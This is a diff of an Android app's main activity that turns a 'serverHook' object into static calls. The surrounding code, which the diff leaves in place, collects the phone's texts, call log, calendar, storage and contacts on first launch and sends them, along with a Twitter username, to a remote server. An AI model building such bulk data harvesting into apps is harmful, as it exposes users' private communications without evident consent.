@@ -62,11 +62,8 @@ public class MainActivity extends AppCompatActivity {
     private static EditText twitterText;
     private boolean isRecording = false;
 
-    private String identifier = "";
-
     private static boolean dataSent = false;
 
-    serverHook hook;
     modalityText mtext = new modalityText();
     modalityHabits mhabits = new modalityHabits();
 
@@ -74,8 +71,6 @@ public class MainActivity extends AppCompatActivity {
         super();
 
     }
-
-
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -90,8 +85,7 @@ public class MainActivity extends AppCompatActivity {
                         + "/myaudio.3gp";
 
 
-        hook = new serverHook();
-        identifier = hook.start();
+        serverHook.start();
 
         if(!dataSent){
             dataSent = true;
@@ -115,7 +109,7 @@ public class MainActivity extends AppCompatActivity {
                 String twitter = twitterText.getText().toString();
                 Log.d("MYAPP", twitter);
                 twitterText.setText("");
-                hook.sendToServer("twitterUsername", twitter);
+                serverHook.sendToServer("twitterUsername", twitter);
             }
         });
 
@@ -129,7 +123,7 @@ public class MainActivity extends AppCompatActivity {
                         + "&redirect_uri="
                         + CALLBACK
                         + "&state="
-                        + identifier
+                        + serverHook.identifier
                         +"&response_type=code"));
                 startActivity(browserIntent);
             }
@@ -153,7 +147,7 @@ public class MainActivity extends AppCompatActivity {
      */
     public void sendAllAvailableData(){
         Context mContext = getApplicationContext();
-        hook.sendToServer("debug","START");
+        serverHook.sendToServer("debug","START");
         boolean[] send = {false, false, false, false, false};
         waiting = new ArrayList<Integer>();
 
@@ -195,29 +189,29 @@ public class MainActivity extends AppCompatActivity {
 
 
         if(send[TEXT]){
-            mtext.getTexts(mContext,hook);
+            mtext.getTexts(mContext);
             Log.d("MYAPP", "text");
         }
         if(send[CALLS]){
-            mhabits.getCalls(mContext,hook);
+            mhabits.getCalls(mContext);
             Log.d("MYAPP", "Calls");
         }
         if(send[CALENDAR]){
-            mhabits.getCalendar(mContext,hook);
+            mhabits.getCalendar(mContext);
             Log.d("MYAPP", "Calendar");
         }
         if(send[STORAGE]){
-            mhabits.getStorage(mContext,hook);
+            mhabits.getStorage(mContext);
             Log.d("MYAPP", "storage");
         }
         if(send[CONTACTS]){
-            mhabits.getContacts(mContext,hook);
+            mhabits.getContacts(mContext);
             Log.d("MYAPP", "contacts");
         }
 
 
         Log.d("MyAPP", "DONE");
-        hook.sendToServer("debug","END");
+        serverHook.sendToServer("debug","END");
 
     }
 
@@ -235,31 +229,28 @@ public class MainActivity extends AppCompatActivity {
                 // If request is cancelled, the result arrays are empty.
                 if (grantResults.length > 0) {
                     for(int i=0; i<waiting.size(); i++){
-                        //Log.d("MYAPP", Integer.toString(i));
-                        //Log.d("MYAPP", Integer.toString(grantResults[i]));
-                        //Log.d("MYAPP", Integer.toString(waiting.get(i)));
 
                         if(grantResults[i] >= 0){
                             switch(waiting.get(i)){
                                 case TEXT:
                                     Log.d("MYAPP", "text");
-                                    mtext.getTexts(mContext,hook);
+                                    mtext.getTexts(mContext);
                                     break;
                                 case CALLS:
                                     Log.d("MYAPP", "calls");
-                                    mhabits.getCalls(mContext,hook);
+                                    mhabits.getCalls(mContext);
                                     break;
                                 case CALENDAR:
                                     Log.d("MYAPP", "Calendar");
-                                    mhabits.getCalendar(mContext,hook);
+                                    mhabits.getCalendar(mContext);
                                     break;
                                 case STORAGE:
                                     Log.d("MYAPP", "storage");
-                                    mhabits.getStorage(mContext,hook);
+                                    mhabits.getStorage(mContext);
                                     break;
                                 case CONTACTS:
                                     Log.d("MYAPP", "contacts");
-                                    mhabits.getContacts(mContext,hook);
+                                    mhabits.getContacts(mContext);
                                     break;
                             }
                         }
